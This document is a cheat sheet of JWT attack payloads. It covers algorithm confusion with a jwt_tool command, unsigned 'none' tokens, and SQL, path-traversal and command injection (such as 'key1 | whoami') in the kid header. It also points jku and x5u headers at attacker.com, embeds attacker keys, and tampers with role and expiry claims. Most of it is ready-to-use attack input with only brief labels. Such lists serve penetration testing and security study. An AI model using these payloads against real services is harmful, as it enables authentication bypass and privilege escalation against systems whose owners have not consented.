# JWT (JSON Web Token) Vulnerabilities & Bypasses

## ========================================
## JWT STRUCTURE
## ========================================

# JWT Format: HEADER.PAYLOAD.SIGNATURE
# Example:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

## ========================================
## ALGORITHM CONFUSION (alg: RS256 → HS256)
## ========================================

# Change algorithm from RS256 to HS256
# Use public key as HMAC secret
# Header:
{
  "alg": "HS256",
  "typ": "JWT"
}

# Tool: jwt_tool
python3 jwt_tool.py JWT_HERE -X k -pk public.pem

## ========================================
## NONE ALGORITHM BYPASS
## ========================================

# Header with alg: none
{
  "alg": "none",
  "typ": "JWT"
}

# Remove signature
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.

## ========================================
## KID (KEY ID) HEADER INJECTION
## ========================================

# SQL Injection in kid
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key1' UNION SELECT 'secretkey'-- -"
}

# Path Traversal in kid
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../../dev/null"
}

# Command Injection in kid
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key1 | whoami"
}

## ========================================
## JKU (JWK SET URL) HEADER INJECTION
## ========================================

# Point to attacker-controlled server
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "http://attacker.com/jwks.json"
}

# jwks.json on attacker server:
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "attacker-key",
      "use": "sig",
      "n": "BASE64_MODULUS",
      "e": "AQAB"
    }
  ]
}

## ========================================
## JWK HEADER INJECTION
## ========================================

# Embed malicious key in header
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "kid": "attacker-key",
    "use": "sig",
    "n": "BASE64_MODULUS",
    "e": "AQAB"
  }
}

## ========================================
## X5U (X.509 URL) HEADER INJECTION
## ========================================

# Point to attacker certificate
{
  "alg": "RS256",
  "typ": "JWT",
  "x5u": "http://attacker.com/cert.pem"
}

## ========================================
## PAYLOAD MANIPULATION
## ========================================

# Privilege Escalation
# Original payload:
{
  "sub": "user123",
  "role": "user",
  "iat": 1516239022
}

# Modified payload:
{
  "sub": "user123",
  "role": "admin",
  "iat": 1516239022
}

# Username Manipulation
{
  "sub": "admin",
  "role": "user",
  "iat": 1516239022
}

## ========================================
## TIMESTAMP BYPASS
## ========================================

# Remove exp claim
{
  "sub": "user123",
  "iat": 1516239022
}

# Set future exp
{
  "sub": "user123",
  "iat": 1516239022,
  "exp": 9999999999
}

# Set negative exp
{
  "sub": "user123",
  "exp": -1
}
